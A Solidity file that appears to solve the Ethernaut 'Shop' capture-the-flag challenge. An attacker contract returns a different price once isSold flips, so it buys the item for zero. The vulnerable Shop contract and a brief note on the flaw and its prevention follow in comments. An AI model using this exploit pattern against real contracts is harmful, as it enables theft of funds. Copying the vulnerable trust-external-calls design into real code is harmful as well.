contract Shopeen is Buyer {
    Shop public _shop;

    constructor(Shop _address) public {
        _shop = _address;
    }

    function buy() public {
        _shop.buy();
    }

    function price() public view override returns (uint256) {
        return _shop.isSold() ? 0 : 100;
    }
}

/*

Contract below is the original ethernaut contract.

Contract data can be manipulated by other contracts.

Security issues with contract: 

  - it is unsafe to change state based on external and untrusted contract logic.


Prevention:

  - Data that can be manipulated should not be relied on to pass requirement checks, 
    for example the function holding the turnary operator in this situation is used to maniupulate 
    the price based on the boolean result.
*/

// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// interface Buyer {
//     function price() external view returns (uint256);
// }

// contract Shop {
//     uint256 public price = 100;
//     bool public isSold;

//     function buy() public {
//         Buyer _buyer = Buyer(msg.sender);

//         if (_buyer.price() >= price && !isSold) {
//             isSold = true;
//             price = _buyer.price();
//         }
//     }
// }
